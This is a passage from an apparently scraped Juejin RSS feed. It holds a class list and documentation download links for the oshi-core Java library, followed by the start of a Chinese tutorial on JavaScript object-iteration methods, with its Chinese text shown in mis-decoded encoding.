oshi.jna.platform.mac.CoreGraphics
oshi.jna.platform.mac.CoreGraphics.CGPoint
oshi.jna.platform.mac.CoreGraphics.CGRect
oshi.jna.platform.mac.CoreGraphics.CGSize
oshi.jna.platform.mac.IOKit
oshi.jna.platform.mac.IOKit.SMCKeyData
oshi.jna.platform.mac.IOKit.SMCKeyDataKeyInfo
oshi.jna.platform.mac.IOKit.SMCKeyDataPLimitData
oshi.jna.platform.mac.IOKit.SMCKeyDataVers
oshi.jna.platform.mac.IOKit.SMCVal
oshi.jna.platform.mac.SystemB
oshi.jna.platform.mac.SystemB.InSockInfo
oshi.jna.platform.mac.SystemB.MacUtmpx
oshi.jna.platform.mac.SystemB.Pri
oshi.jna.platform.mac.SystemB.ProcFdInfo
oshi.jna.platform.mac.SystemB.ProcFileInfo
oshi.jna.platform.mac.SystemB.SocketFdInfo
oshi.jna.platform.mac.SystemB.SocketInfo
oshi.jna.platform.mac.SystemB.TcpSockInfo
oshi.jna.platform.mac.SystemConfiguration
oshi.jna.platform.mac.SystemConfiguration.SCNetworkInterfaceRef
oshi.jna.platform.unix.AixLibc
oshi.jna.platform.unix.AixLibc.AixLwpsInfo
oshi.jna.platform.unix.AixLibc.AixPsInfo
oshi.jna.platform.unix.AixLibc.Timestruc
oshi.jna.platform.unix.CLibrary
oshi.jna.platform.unix.CLibrary.Addrinfo
oshi.jna.platform.unix.CLibrary.Addrinfo.ByReference
oshi.jna.platform.unix.CLibrary.BsdIp6stat
oshi.jna.platform.unix.CLibrary.BsdIpstat
oshi.jna.platform.unix.CLibrary.BsdTcpstat
oshi.jna.platform.unix.CLibrary.BsdUdpstat
oshi.jna.platform.unix.CLibrary.Sockaddr
oshi.jna.platform.unix.CLibrary.Sockaddr.ByReference
oshi.jna.platform.unix.FreeBsdLibc
oshi.jna.platform.unix.FreeBsdLibc.CpTime
oshi.jna.platform.unix.FreeBsdLibc.FreeBsdUtmpx
oshi.jna.platform.unix.FreeBsdLibc.Timeval
oshi.jna.platform.unix.OpenBsdLibc
oshi.jna.platform.unix.OpenBsdLibc.Bcachestats
oshi.jna.platform.unix.OpenBsdLibc.Timeval
oshi.jna.platform.unix.SolarisLibc
oshi.jna.platform.unix.SolarisLibc.Exit_status
oshi.jna.platform.unix.SolarisLibc.SolarisLwpsInfo
oshi.jna.platform.unix.SolarisLibc.SolarisPrUsage
oshi.jna.platform.unix.SolarisLibc.SolarisPsInfo
oshi.jna.platform.unix.SolarisLibc.SolarisUtmpx
oshi.jna.platform.unix.SolarisLibc.Timestruc
oshi.jna.platform.unix.SolarisLibc.Timeval
oshi.jna.platform.windows.NtDll
oshi.jna.platform.windows.NtDll.CURDIR
oshi.jna.platform.windows.NtDll.PEB
oshi.jna.platform.windows.NtDll.PROCESS_BASIC_INFORMATION
oshi.jna.platform.windows.NtDll.RTL_DRIVE_LETTER_CURDIR
oshi.jna.platform.windows.NtDll.RTL_USER_PROCESS_PARAMETERS
oshi.jna.platform.windows.NtDll.STRING
oshi.jna.platform.windows.NtDll.UNICODE_STRING
oshi.jna.platform.windows.PowrProf
oshi.jna.platform.windows.PowrProf.BATTERY_INFORMATION
oshi.jna.platform.windows.PowrProf.BATTERY_MANUFACTURE_DATE
oshi.jna.platform.windows.PowrProf.BATTERY_QUERY_INFORMATION
oshi.jna.platform.windows.PowrProf.BATTERY_QUERY_INFORMATION_LEVEL
oshi.jna.platform.windows.PowrProf.BATTERY_STATUS
oshi.jna.platform.windows.PowrProf.BATTERY_WAIT_STATUS
oshi.jna.platform.windows.PowrProf.ProcessorPowerInformation
oshi.jna.platform.windows.PowrProf.SystemBatteryState
oshi.jna.platform.windows.WinNT
oshi.jna.platform.windows.WinNT.TOKEN_ELEVATION
oshi.software.common.AbstractFileSystem
oshi.software.common.AbstractInternetProtocolStats
oshi.software.common.AbstractNetworkParams
oshi.software.common.AbstractOSFileStore
oshi.software.common.AbstractOSProcess
oshi.software.common.AbstractOSThread
oshi.software.common.AbstractOperatingSystem
oshi.software.os.FileSystem
oshi.software.os.InternetProtocolStats
oshi.software.os.InternetProtocolStats.IPConnection
oshi.software.os.InternetProtocolStats.TcpState
oshi.software.os.InternetProtocolStats.TcpStats
oshi.software.os.InternetProtocolStats.UdpStats
oshi.software.os.NetworkParams
oshi.software.os.OSDesktopWindow
oshi.software.os.OSFileStore
oshi.software.os.OSProcess
oshi.software.os.OSProcess.State
oshi.software.os.OSService
oshi.software.os.OSService.State
oshi.software.os.OSSession
oshi.software.os.OSThread
oshi.software.os.OSThread.ThreadFiltering
oshi.software.os.OperatingSystem
oshi.software.os.OperatingSystem.OSVersionInfo
oshi.software.os.OperatingSystem.ProcessFiltering
oshi.software.os.OperatingSystem.ProcessSorting
oshi.software.os.linux.LinuxFileSystem
oshi.software.os.linux.LinuxInternetProtocolStats
oshi.software.os.linux.LinuxOSFileStore
oshi.software.os.linux.LinuxOSProcess
oshi.software.os.linux.LinuxOSThread
oshi.software.os.linux.LinuxOperatingSystem
oshi.software.os.mac.MacFileSystem
oshi.software.os.mac.MacInternetProtocolStats
oshi.software.os.mac.MacOSFileStore
oshi.software.os.mac.MacOSProcess
oshi.software.os.mac.MacOSThread
oshi.software.os.mac.MacOperatingSystem
oshi.software.os.unix.aix.AixFileSystem
oshi.software.os.unix.aix.AixInternetProtocolStats
oshi.software.os.unix.aix.AixOSFileStore
oshi.software.os.unix.aix.AixOSProcess
oshi.software.os.unix.aix.AixOSThread
oshi.software.os.unix.aix.AixOperatingSystem
oshi.software.os.unix.freebsd.FreeBsdFileSystem
oshi.software.os.unix.freebsd.FreeBsdInternetProtocolStats
oshi.software.os.unix.freebsd.FreeBsdOSFileStore
oshi.software.os.unix.freebsd.FreeBsdOSProcess
oshi.software.os.unix.freebsd.FreeBsdOSThread
oshi.software.os.unix.freebsd.FreeBsdOperatingSystem
oshi.software.os.unix.openbsd.OpenBsdFileSystem
oshi.software.os.unix.openbsd.OpenBsdInternetProtocolStats
oshi.software.os.unix.openbsd.OpenBsdNetworkParams
oshi.software.os.unix.openbsd.OpenBsdOSFileStore
oshi.software.os.unix.openbsd.OpenBsdOSProcess
oshi.software.os.unix.openbsd.OpenBsdOSThread
oshi.software.os.unix.openbsd.OpenBsdOperatingSystem
oshi.software.os.unix.solaris.SolarisFileSystem
oshi.software.os.unix.solaris.SolarisInternetProtocolStats
oshi.software.os.unix.solaris.SolarisOSFileStore
oshi.software.os.unix.solaris.SolarisOSProcess
oshi.software.os.unix.solaris.SolarisOSThread
oshi.software.os.unix.solaris.SolarisOperatingSystem
oshi.software.os.windows.WindowsFileSystem
oshi.software.os.windows.WindowsInternetProtocolStats
oshi.software.os.windows.WindowsOSFileStore
oshi.software.os.windows.WindowsOSProcess
oshi.software.os.windows.WindowsOSThread
oshi.software.os.windows.WindowsOperatingSystem
oshi.util.Constants
oshi.util.EdidUtil
oshi.util.ExecutingCommand
oshi.util.FileSystemUtil
oshi.util.FileUtil
oshi.util.FormatUtil
oshi.util.GlobalConfig
oshi.util.GlobalConfig.PropertyException
oshi.util.Memoizer
oshi.util.ParseUtil
oshi.util.UserGroupInfo
oshi.util.Util
oshi.util.platform.linux.ProcPath
oshi.util.platform.mac.CFUtil
oshi.util.platform.mac.SmcUtil
oshi.util.platform.mac.SysctlUtil
oshi.util.platform.unix.freebsd.BsdSysctlUtil
oshi.util.platform.unix.freebsd.ProcstatUtil
oshi.util.platform.unix.openbsd.FstatUtil
oshi.util.platform.unix.openbsd.OpenBsdSysctlUtil
oshi.util.platform.unix.solaris.KstatUtil
oshi.util.platform.unix.solaris.KstatUtil.KstatChain
oshi.util.platform.windows.PerfCounterQuery
oshi.util.platform.windows.PerfCounterQuery.PdhCounterProperty
oshi.util.platform.windows.PerfCounterQueryHandler
oshi.util.platform.windows.PerfCounterWildcardQuery
oshi.util.platform.windows.PerfCounterWildcardQuery.PdhCounterWildcardProperty
oshi.util.platform.windows.PerfDataUtil
oshi.util.platform.windows.PerfDataUtil.PerfCounter
oshi.util.platform.windows.WmiQueryHandler
oshi.util.platform.windows.WmiUtil
oshi.util.tuples.Pair
oshi.util.tuples.Quartet
oshi.util.tuples.Quintet
oshi.util.tuples.Triplet 
</code></pre>
<h2 data-id="heading-11">å®Œæ•´æ–‡æ¡£ä¸‹è½½åœ°å€ï¼ˆç±»ã€æ–¹æ³•ã€å‚æ•°è¯´æ˜ï¼‰</h2>
<ul>
<li><strong>oshi-core-6.4.0.jarä¸­æ–‡-è‹±æ–‡å¯¹ç…§æ–‡æ¡£.zip</strong> ä¸‹è½½åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fhanshuixin.org%2Fresource%2FfileDetails%3FgroupId%3Dcom.github.oshi%26artifactId%3Doshi-core%26version%3D6.4.0" target="_blank" title="https://hanshuixin.org/resource/fileDetails?groupId=com.github.oshi&amp;artifactId=oshi-core&amp;version=6.4.0" ref="nofollow noopener noreferrer">hanshuixin.org/resource/fiâ€¦</a></li>
<li><strong>oshi-core å…¶ä»–ç‰ˆæœ¬ä¸­æ–‡æ–‡æ¡£</strong> ä¸‹è½½åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fhanshuixin.org%2Fresource%2F%3FgroupId%3Dcom.github.oshi%26artifactId%3Doshi-core" target="_blank" title="https://hanshuixin.org/resource/?groupId=com.github.oshi&amp;artifactId=oshi-core" ref="nofollow noopener noreferrer">hanshuixin.org/resource/?gâ€¦</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript éå†æ–¹æ³•è¯¦è§£]]></title>    <link>https://juejin.cn/post/7589919989038579775</link>    <guid>https://juejin.cn/post/7589919989038579775</guid>    <pubDate>2026-01-02T06:27:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589919989038579775" data-draft-id="7589919989038547007" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript éå†æ–¹æ³•è¯¦è§£"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,ä»£ç è§„èŒƒ"/> <meta itemprop="datePublished" content="2026-01-02T06:27:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="UIUV"/> <meta itemprop="url" content="https://juejin.cn/user/1036168457093483"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript éå†æ–¹æ³•è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1036168457093483/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    UIUV
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:27:50.000Z" title="Fri Jan 02 2026 06:27:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript éå†æ–¹æ³•è¯¦è§£</h2>
<p>JavaScript æä¾›äº†å¤šç§éå†æ–¹æ³•ï¼Œæ¯ç§æ–¹æ³•éƒ½æœ‰å…¶ç‹¬ç‰¹çš„è¯­æ³•ç»“æ„ã€ä½¿ç”¨åœºæ™¯å’Œæ³¨æ„äº‹é¡¹ã€‚æŒæ¡è¿™äº›éå†æ–¹æ³•ä¸ä»…èƒ½æé«˜ä»£ç è´¨é‡ï¼Œè¿˜èƒ½ä½¿å¼€å‘æ›´åŠ é«˜æ•ˆã€‚æœ¬æ–‡å°†ç³»ç»Ÿåœ°ä»‹ç» JavaScript ä¸­å¸¸è§çš„éå†æ–¹æ³•ï¼ŒåŒ…æ‹¬å¯¹è±¡éå†å’Œæ•°ç»„éå†ä¸¤å¤§ç±»ï¼Œå¹¶åˆ†æå®ƒä»¬çš„ç‰¹ç‚¹ã€é€‚ç”¨åœºæ™¯åŠæœ€ä½³å®è·µã€‚</p>
<h3 data-id="heading-1">å¯¹è±¡éå†æ–¹æ³•</h3>
<h4 data-id="heading-2">for...in å¾ªç¯</h4>
<p><strong>è¯­æ³•</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> property <span class="hljs-keyword">in</span> object) {
  <span class="hljs-comment">// ä½¿ç”¨object[property]è®¿é—®å±æ€§å€¼</span>
}
</code></pre>
<p><strong>ç”¨æ³•</strong>ï¼šfor...in å¾ªç¯ç”¨äºéå†å¯¹è±¡çš„æ‰€æœ‰å¯æšä¸¾å±æ€§ï¼ŒåŒ…æ‹¬ç»§æ‰¿çš„å±æ€§ã€‚å®ƒä¼šæŒ‰é¡ºåºè¿”å›å¯¹è±¡è‡ªèº«çš„æ‰€æœ‰å¯æšä¸¾å±æ€§ï¼Œä»¥åŠåŸå‹é“¾ä¸Šå¯æšä¸¾çš„å±æ€§ï¼Œç›´åˆ°åˆ°è¾¾åŸå‹é“¾çš„ç»ˆç‚¹ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
  <span class="hljs-attr">occupation</span>: <span class="hljs-string">'Engineer'</span>
};

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> person) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${key}</span>: <span class="hljs-subst">${person[key]}</span>`</span>);
}
<span class="hljs-comment">// è¾“å‡º: name: Alice, age: 25, occupation: Engineer</span>
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li>
<p><strong>éå†ç»§æ‰¿å±æ€§</strong>ï¼šfor...in ä¼šéå†å¯¹è±¡åŸå‹é“¾ä¸Šçš„å±æ€§ï¼Œå¯èƒ½å¯¼è‡´æ„å¤–ç»“æœã€‚</p>
</li>
<li>
<p><strong>ä½¿ç”¨ hasOwnProperty è¿‡æ»¤</strong>ï¼šè‹¥åªéœ€éå†å¯¹è±¡è‡ªèº«çš„å±æ€§ï¼Œåº”ä½¿ç”¨ hasOwnProperty æ–¹æ³•è¿‡æ»¤ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> person) {
  <span class="hljs-keyword">if</span> (person.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${key}</span>: <span class="hljs-subst">${person[key]}</span>`</span>);
  }
}
</code></pre>
</li>
<li>
<p><strong>ä¸å¤„ç† Symbol ç±»å‹å±æ€§</strong>ï¼šfor...in æ— æ³•éå† Symbol ç±»å‹çš„å±æ€§ã€‚</p>
</li>
<li>
<p><strong>ä¸å¯æšä¸¾å±æ€§ä¸è¢«è®¿é—®</strong>ï¼šå³ä½¿å±æ€§ä¸å¯æšä¸¾ï¼Œfor...in ä¹Ÿä¸ä¼šéå†å®ƒä»¬ã€‚</p>
</li>
<li>
<p><strong>è¿­ä»£è¿‡ç¨‹ä¸­ä¿®æ”¹å¯¹è±¡å¯èƒ½æœ‰é—®é¢˜</strong>ï¼šåœ¨å¾ªç¯è¿‡ç¨‹ä¸­æ·»åŠ ã€åˆ é™¤æˆ–ä¿®æ”¹å¯¹è±¡å±æ€§å¯èƒ½å¯¼è‡´ä¸å¯é¢„æµ‹çš„è¡Œä¸ºã€‚</p>
</li>
</ul>
<h4 data-id="heading-3">Object.keys() + for...of/forEach</h4>
<p><strong>è¯­æ³•</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç»“åˆfor...of</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(object)) {
  <span class="hljs-comment">// ä½¿ç”¨object[key]è®¿é—®å±æ€§å€¼</span>
}

<span class="hljs-comment">// ç»“åˆforEach</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(object).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
  <span class="hljs-comment">// ä½¿ç”¨object[key]è®¿é—®å±æ€§å€¼</span>
});
</code></pre>
<p><strong>ç”¨æ³•</strong>ï¼šObject.keys () è¿”å›å¯¹è±¡æ‰€æœ‰å¯æšä¸¾çš„è‡ªæœ‰å±æ€§åç»„æˆçš„æ•°ç»„ï¼Œç»“åˆ for...of æˆ– forEach å¯å®‰å…¨éå†å¯¹è±¡è‡ªèº«å±æ€§ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
  <span class="hljs-attr">occupation</span>: <span class="hljs-string">'Engineer'</span>
};

<span class="hljs-comment">// for...ofç»“åˆ</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(person)) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${key}</span>: <span class="hljs-subst">${person[key]}</span>`</span>);
}
<span class="hljs-comment">// è¾“å‡º: name: Alice, age: 25, occupation: Engineer</span>

<span class="hljs-comment">// forEachç»“åˆ</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(person).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person[key]);
});
<span class="hljs-comment">// åŒæ ·è¾“å‡ºä¸‰ä¸ªå±æ€§å€¼</span>
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li><strong>ä»…éå†è‡ªæœ‰å±æ€§</strong>ï¼šä¸ for...in ä¸åŒï¼ŒObject.keys () ä»…éå†å¯¹è±¡è‡ªèº«çš„å¯æšä¸¾å±æ€§ã€‚</li>
<li><strong>ä¸åŒ…å« Symbol é”®</strong>ï¼šObject.keys () ä»…è¿”å›å­—ç¬¦ä¸²ç±»å‹çš„å±æ€§åã€‚</li>
<li><strong>ESLint æ¨è</strong>ï¼šè®¸å¤š JavaScript é£æ ¼æŒ‡å—æ¨èä½¿ç”¨ Object.keys () ä»£æ›¿ for...in éå†æ•°ç»„ã€‚</li>
<li><strong>è¿”å›å€¼æ˜¯æ•°ç»„</strong>ï¼šObject.keys () è¿”å›çš„æ˜¯æ•°ç»„ï¼Œå¯ä»¥åƒå…¶ä»–æ•°ç»„ä¸€æ ·è¿›è¡Œæ“ä½œï¼ˆå¦‚æ’åºã€è¿‡æ»¤ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-4">Object.values() + for...of/forEach</h4>
<p><strong>è¯­æ³•</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç»“åˆfor...of</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> value <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(object)) {
  <span class="hljs-comment">// ç›´æ¥ä½¿ç”¨value</span>
}

<span class="hljs-comment">// ç»“åˆforEach</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(object).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> {
  <span class="hljs-comment">// ç›´æ¥ä½¿ç”¨value</span>
});
</code></pre>
<p><strong>ç”¨æ³•</strong>ï¼šObject.values () è¿”å›å¯¹è±¡æ‰€æœ‰å¯æšä¸¾çš„è‡ªæœ‰å±æ€§å€¼ç»„æˆçš„æ•°ç»„ï¼Œç»“åˆ for...of æˆ– forEach å¯ç›´æ¥éå†å¯¹è±¡å±æ€§å€¼ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
  <span class="hljs-attr">occupation</span>: <span class="hljs-string">'Engineer'</span>
};

<span class="hljs-comment">// for...ofç»“åˆ</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> value <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(person)) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value);
}
<span class="hljs-comment">// è¾“å‡º: Alice, 25, Engineer</span>

<span class="hljs-comment">// forEachç»“åˆ</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(person).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value);
});
<span class="hljs-comment">// åŒæ ·è¾“å‡ºä¸‰ä¸ªå±æ€§å€¼</span>
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li><strong>ä»…éå†è‡ªæœ‰å±æ€§å€¼</strong>ï¼šä¸ Object.keys () ç±»ä¼¼ï¼ŒObject.values () ä¹Ÿä»…éå†å¯¹è±¡è‡ªèº«çš„å¯æšä¸¾å±æ€§ã€‚</li>
<li><strong>ä¸åŒ…å«é”®ä¿¡æ¯</strong>ï¼šæ— æ³•ç›´æ¥è·å–å±æ€§åï¼Œåªèƒ½è®¿é—®å±æ€§å€¼ï¼ˆè‹¥éœ€é”®åéœ€ä½¿ç”¨ Object.entries ()ï¼‰ã€‚</li>
<li><strong>ESLint æ¨è</strong>ï¼šå½“åªéœ€è¦å±æ€§å€¼æ—¶ï¼Œä½¿ç”¨ Object.values () æ¯” for...in æ›´é«˜æ•ˆã€æ›´å®‰å…¨ã€‚</li>
<li><strong>è¿”å›å€¼æ˜¯æ•°ç»„</strong>ï¼šObject.values () è¿”å›çš„æ˜¯æ•°ç»„ï¼Œæ”¯æŒæ•°ç»„çš„æ‰€æœ‰æ–¹æ³•ï¼ˆå¦‚ mapã€filterï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-5">Object.entries() + for...of/forEach</h4>
<p><strong>è¯­æ³•</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç»“åˆfor...of</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, value] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(object)) {
  <span class="hljs-comment">// åŒæ—¶ä½¿ç”¨keyå’Œvalue</span>
}

<span class="hljs-comment">// ç»“åˆforEach</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(object).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">[key, value]</span>) =&gt;</span> {
  <span class="hljs-comment">// åŒæ—¶ä½¿ç”¨keyå’Œvalue</span>
});
</code></pre>
<p><strong>ç”¨æ³•</strong>ï¼šObject.entries () è¿”å›å¯¹è±¡æ‰€æœ‰å¯æšä¸¾çš„è‡ªæœ‰å±æ€§çš„é”®å€¼å¯¹æ•°ç»„ï¼Œç»“åˆ for...of æˆ– forEach å¯åŒæ—¶è®¿é—®å±æ€§åå’Œå±æ€§å€¼ã€‚</p>
